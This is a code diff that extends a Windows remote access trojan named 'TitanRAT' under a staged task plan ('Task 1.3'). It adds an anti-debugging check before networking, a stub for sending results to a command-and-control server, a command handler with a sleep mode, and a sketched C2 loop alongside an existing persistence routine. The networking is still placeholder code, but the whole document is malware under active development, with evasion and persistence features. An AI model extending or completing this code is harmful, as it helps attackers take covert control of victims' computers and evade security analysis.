@@ -1,9 +1,10 @@
-// Core/main.cpp (Updated for Task 1.2)
+// Core/main.cpp (Updated for Task 1.3)
 #include <windows.h>
 #include <string>
 #include <fstream>
 #include <cctype>
 #include "persistence.h"
+#include "anti_debug.h"  // Task 1.3: anti-debug module
 
 constexpr unsigned long long FNV_OFFSET_BASIS = 14695981039346656037ULL;
 constexpr unsigned long long FNV_PRIME = 1099511628211ULL;
@@ -105,6 +106,27 @@ static bool has_arg(LPSTR cmdLine, const char* flag) {
     return cl.find(flag) != std::string::npos;
 }
 
+// Placeholder: send_result stub (to be implemented in network module)
+static void send_result(const char* data) {
+    // TODO: implement C2 response sending
+    OutputDebugStringA("[TitanRAT] send_result: ");
+    OutputDebugStringA(data);
+    OutputDebugStringA("\n");
+}
+
+// Command handler with sleep mode check (Task 1.3 integration)
+static void handle_command(const char* cmd) {
+    // Task 1.3: if in sleep mode, reject commands
+    if (g_sleepMode) {
+        send_result("SLEEP_MODE");
+        return;
+    }
+    
+    // TODO: actual command dispatch logic
+    // For now, just echo
+    send_result("OK");
+}
+
 int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
     OutputDebugStringA("[TitanRAT] Started\n");
     
@@ -151,11 +173,24 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
         return 1;
     }
     
+    // Task 1.3: Anti-debug check (after config, before network)
+    check_debugger();
+    
     // Persistence check on normal startup
     check_persistence();
     
     // Future: main C2 loop
-    // while(true) { ... }
+    // while(true) {
+    //     if (g_sleepMode) {
+    //         send_result("SLEEP_MODE");  // heartbeat only
+    //         Sleep(cfg.heartbeat_interval * 1000);
+    //         continue;
+    //     }
+    //     // ... receive and handle commands via handle_command() ...
+    // }
+
+    // Demo: simulate one command handling
+    handle_command("ping");
     
     CloseHandle(h_mutex);
     return 0;
